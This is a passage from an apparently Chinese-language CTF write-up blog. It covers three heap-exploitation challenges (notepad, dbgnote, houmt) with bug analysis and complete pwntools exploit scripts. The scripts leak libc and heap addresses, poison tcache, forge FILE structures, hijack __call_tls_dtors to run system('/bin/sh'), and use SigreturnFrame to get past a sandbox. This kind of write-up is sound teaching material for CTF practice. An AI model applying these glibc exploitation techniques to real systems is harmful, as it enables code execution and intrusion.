unsorted bin 泄露 libc，再通过 UAF 造成双指针指向同一个堆，一个用来 free 一个用来 edit。申请到 _IO_list_all，打 FILE 板子就好了，最后通过 exit(0) 触发链子。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./notepad&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, date, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;size: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;date: &quot;</span>, date)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, date, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;date: &quot;</span>, date)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment">#0-7</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;protect&#x27;</span>, <span class="string">b&#x27;aaaaa&#x27;</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fd810019ce0</span> - <span class="number">0x7fd80fe00000</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;date: &quot;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base===&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;cccc&#x27;</span>) <span class="comment">#9(6)</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(_IO_list_all^key), p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;anza&#x27;</span>, <span class="string">b&#x27;dddd&#x27;</span>)  <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x80</span>, p64(heap_base+<span class="number">0x850</span>), <span class="string">b&#x27;&#x27;</span>)  <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line"></span><br><span class="line">fake_IO_list_all_addr = heap_base + <span class="number">0x850</span></span><br><span class="line">fake_IO_list_all = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base+<span class="number">0x970</span>)</span><br><span class="line">fake_IO_list_all = fake_IO_list_all.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line"><span class="comment"># fake_IO_list_all = fake_IO_list_all.ljust(0xe0+0xe0, b&#x27;\x00&#x27;) + p64(heap_base)</span></span><br><span class="line"></span><br><span class="line">fake_wide_data = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_base+<span class="number">0xa90</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf1</span></span><br><span class="line">fake_wide_vtable = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">fake_wide_vtable = fake_wide_vtable.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_IO_list_all)   <span class="comment">#12</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_wide_data)     <span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;anza&#x27;</span>, fake_wide_vtable)   <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-dbgnote"><a href="#3-dbgnote" class="headerlink" title="3. dbgnote"></a>3. dbgnote</h2><p>有些代码看不太懂。查了一下好像是强网杯的原题<a href="https://www.anquanke.com/post/id/256124">广州强网杯pwn_mini WP</a>。</p><p>程序运行需要第二个参数，为<code>dbg</code>或者<code>run</code>。程序初试的时候申请了两个 signal 信号：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072110909.png" alt="image-20230907211021001" style="zoom:50%;" /><p>比较重要的是 abort 触发的 handler，会以 dbg 参数重启程序：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072114506.png" alt="image-20230907211418364" style="zoom:50%;" /><p>我们看一下 dbg 和 run 运行的程序有什么区别，dbg 中有个任意读和任意写，run 其实就是菜单，但是并没有找到与堆有关的漏洞：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072118096.png" alt="image-20230907211834902" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072120745.png" alt="image-20230907212017529" style="zoom:50%;" /><p>在 run 程序中存在一个全局变量溢出 2 个字节：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072135152.png" alt="image-20230907213531095" style="zoom:50%;" /><p>在 run 程序中堆操作读入 idx 的地方发现了一个栈溢出，注意通过这个栈溢出是可以造成 abort 的，也就可以触发 handler：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072124739.png" alt="image-20230907212442697" style="zoom:50%;" /><p>同时在 Super_Note 操作中有一个 gift，可以泄露栈上对应地址的最后两位：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072145857.png" alt="image-20230907214512813" style="zoom: 50%;" /><p>最后还有一个知识点，有关 libc 基址的泄露：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=all 这个环境变量，预示着程序执行时打印loader的信息，通过里面的信息可以获取libc地址。</span><br></pre></td></tr></table></figure><p>本题的思路是将 LD_DEBUG=all 布置在栈上，然后通过 gift 获取到栈上的最后两字节，再计算偏移得到 LD_DEBUG=all 的地址，再通过全局变量的两个溢出修改 envp 指向 LD_DEBUG=all 的地址，通过地址任意读泄露 ld 基址，用地址任意写去劫持 fsbase 相关结构体，在 exit 调用 __call_tls_dtors 触发链子。</p><p>这里有三个需要注意的地方：</p><ol><li><p>fsbase 结构体在哪个位置？我和舒哥都是在 ubuntu22.04 上运行的程序，但映射分布有些许差异，我的分布在 ld 基址附近，而舒哥的分布在 libc 基址附近。如果分布在 libc 附近，就不需要任意读来泄露什么了，直接打 fsbase 就行了，但如果分布在 ld 附近，就有必要泄露 ld 基址了，这边可以通过 _dl_argv_ptr 这个变量来泄露：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101300968.png" alt="image-20230910130020654" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101257383.png" alt="image-20230910125743268" style="zoom:50%;" /></li><li><p>fsbase 的板子该怎么打？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fsbase = ld_base - <span class="number">0x168C0</span></span><br><span class="line">target = fsbase - <span class="number">0x30</span> - <span class="number">0x28</span></span><br><span class="line">payload = p64(target+<span class="number">0x70</span>)</span><br><span class="line">payload += <span class="number">12</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fsbase) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(target+<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure><p>效果（只显示了部分）如下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101316985.png" alt="image-20230910131656766" style="zoom:50%;" /></li><li><p>链子是如何触发的？我们看一下 __call_tls_dtors 的汇编：</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309101329701.png" alt="image-20230910132905633"></p><p>因此在 call rax 的时候即完成了 system(“/bin/sh\x00”)的操作</p></li></ol><p>EXP 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&quot;./dbgnote&quot;</span>, <span class="string">&quot;run&quot;</span>])</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">name = <span class="string">b&quot;LD_DEBUG=all&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;UserName: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line">gift = <span class="string">b&quot;++--++--&quot;</span></span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *$rebase(0x1524)&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;$ &quot;</span>, gift)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Super note: &quot;</span>)</span><br><span class="line">stack_low = <span class="built_in">int</span>(io.recvline(), <span class="number">10</span>)</span><br><span class="line">target = stack_low + <span class="number">0x1c</span></span><br><span class="line">log.success(<span class="string">&quot;stack_low==&gt;&quot;</span>+<span class="built_in">hex</span>(stack_low))</span><br><span class="line">log.success(<span class="string">&quot;target=====&gt;&quot;</span>+<span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line">hijack = <span class="string">b&quot;a&quot;</span>*<span class="number">0x30</span> + p16(target)</span><br><span class="line">io.sendafter(<span class="string">b&quot;$ &quot;</span>, hijack)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;$ &quot;</span>, <span class="string">b&quot;Note_Add&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Size: &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;file=libc.so.6 [0];  generating link map&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;base: 0x0000&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Please don&#x27;t patch this normal function, we will check it!&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">_dl_argv_ptr = libc_base + <span class="number">0x218E08</span></span><br><span class="line">io.sendafter(<span class="string">b&quot;[Addr] &quot;</span>, p64(_dl_argv_ptr))</span><br><span class="line">log.success(<span class="string">&quot;ld_ptr=====&gt;&quot;</span>+<span class="built_in">hex</span>(_dl_argv_ptr))</span><br><span class="line">offset = <span class="number">0x7fd730bedac0</span> - <span class="number">0x7fd730bb4000</span></span><br><span class="line">ld_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;ld_base====&gt;&quot;</span>+<span class="built_in">hex</span>(ld_base))</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">fsbase = ld_base - <span class="number">0x168C0</span></span><br><span class="line">target = fsbase - <span class="number">0x30</span> - <span class="number">0x28</span></span><br><span class="line">payload = p64(target+<span class="number">0x70</span>)</span><br><span class="line">payload += <span class="number">12</span>*p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fsbase) + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># paylaod += p64(libc_base-0x28c0) + p64(0)</span></span><br><span class="line">payload += p64(target+<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(libc_base + 0x0000000000036c06)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x01C32)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;[Addr] &quot;</span>, p64(target))</span><br><span class="line">io.sendafter(<span class="string">b&quot;[Write] &quot;</span>, payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-houmt"><a href="#4-houmt" class="headerlink" title="4. houmt"></a>4. houmt</h2><p>看下来感觉就是限制太多、好麻烦，菜鸟崩溃😭，于是跟着出题人的 wp 来调：<a href="https://www.cnblogs.com/winmt/articles/17512349.html">CISCN-2023 华东南分区赛 houmt 出题小记</a>。</p><p>题目的漏洞是 UAF，限制是 add 固定 0x100 大小， 2 次 show，1 次 edit，还只能 edit 8字节，<strong>无法申请到 libc 上的地址</strong>，在 show 的时候还有加密，但加密部分我们先不关心：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102149421.png" alt="image-20230910214957369" style="zoom:50%;" /><p>漏洞思路是：</p><ol><li><p>申请堆块，释放，获得 heap_base。</p></li><li><p>释放满 7 个堆块，再释放一个溢出至 unsorted bin，泄露出 libc_base。</p></li><li><p>通过 UAF 配合 Edit，劫持 <strong>tcache_perthread_struct</strong> 中 0x110 对应的指针附近。</p></li><li><p>不断释放、申请该结构体中的 0x110 对应的指针为任意地址，即可进行多次任意地址写。</p></li><li><p>由于本题没有正常的退出，可以通过修改<code>top chunk</code>大小触发<code>__malloc_assert</code>，这一块作者给出了很详细的解释：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102234979.png" alt="image-20230910223450740" style="zoom:50%;" /></li><li><p>然后就是绕过沙箱，一般就是利用<code>setcontext+61</code>以及<code>magic</code>完成对目标堆块地址的转换，沙箱规则如下：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309102236633.png" alt="image-20230910223646356" style="zoom:50%;" /><p>一般绕过 read 的 fd==0 限制方法是利用 close(0)，但可以利用 mmap 将 fd=3 映射到某段内存中，再利用 writev 代替 write 函数。</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./houmt&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input your choice &gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the index : &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="string">b&quot;a&quot;</span>)   <span class="comment">#0-7</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    leak.append(u8(io.recv(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    leak[i] = leak[i] ^ leak[i+<span class="number">1</span>]</span><br><span class="line">t = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    t = t + p8(leak[i])</span><br><span class="line">key = u64(t.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">leak.clear()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    leak.append(u8(io.recv(<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    leak[i] = leak[i] ^ leak[i+<span class="number">1</span>]</span><br><span class="line">t = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    t = t + p8(leak[i])</span><br><span class="line">libc_base = u64(t.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x70</span></span><br><span class="line">ld_base = libc_base + <span class="number">0x1ee000</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(key^(heap_base+<span class="number">0xf0</span>)))</span><br><span class="line">add(<span class="string">b&quot;\n&quot;</span>)  <span class="comment">#8</span></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(heap_base+<span class="number">0x100</span>))  <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">magic = libc_base + <span class="number">0x14A0A0</span></span><br><span class="line">add(p64(<span class="number">0</span>)+p64(ld_base+ld.sym[<span class="string">&quot;_rtld_global&quot;</span>]+<span class="number">0xf90</span>))   <span class="comment">#10</span></span><br><span class="line">add(p64(magic)) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">address = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = address</span><br><span class="line">frame.rdx = <span class="number">0x100</span></span><br><span class="line">frame.rsp = address</span><br><span class="line">frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="comment"># print(frame)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(ld_base+ld.sym[<span class="string">&quot;_rtld_global&quot;</span>]+<span class="number">0x980</span>)) <span class="comment">#12</span></span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">2</span> + p64(ld_base + ld.sym[<span class="string">&#x27;_rtld_global&#x27;</span>] + <span class="number">0x988</span>) + 